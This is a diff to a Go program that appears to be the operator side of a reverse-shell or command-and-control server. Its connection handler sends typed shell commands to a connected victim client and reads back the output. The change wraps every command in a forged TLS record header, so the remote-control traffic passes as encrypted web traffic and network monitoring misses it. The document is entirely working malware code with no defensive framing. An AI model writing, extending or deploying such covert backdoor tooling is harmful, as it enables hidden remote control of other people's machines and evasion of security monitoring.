@@ -7,6 +7,8 @@ import (
         "encoding/hex"
         "net"
         "os"
+        "encoding/binary"
+        "strings"
 )
 
 const (
@@ -139,16 +141,22 @@ func processClient(connection net.Conn) {
                 consoleReader := bufio.NewReader(os.Stdin)
                 fmt.Print("$ ")
                 cmd, _ := consoleReader.ReadString('\n')
+                cmd = strings.TrimRight(cmd, "\n")
 
-                if (len(cmd) > 4 && cmd[0:4] == "exit") {
+                if (len(cmd) > 3 && cmd[0:4] == "exit") {
                         fmt.Println("\n[+] Closing connection")
                         connection.Close()
                         break
                 }
 
-                connection.Write([]byte(cmd))
-                buffer := make([]byte, 50000)
+                cmd_h := []byte{0x17, 0x03, 0x01}
+                cmd_s := make([]byte, 2)
+                binary.BigEndian.PutUint16(cmd_s, uint16(len(cmd)))
+                cmd_p1 := append(cmd_h, cmd_s...)
+                cmd_p2 := append(cmd_p1, []byte(cmd)...)
+                connection.Write(cmd_p2)
 
+                buffer := make([]byte, 50000)
                 mLen, err := connection.Read(buffer)
                 if err != nil {
                         fmt.Println("\n[-] Client disconnected")
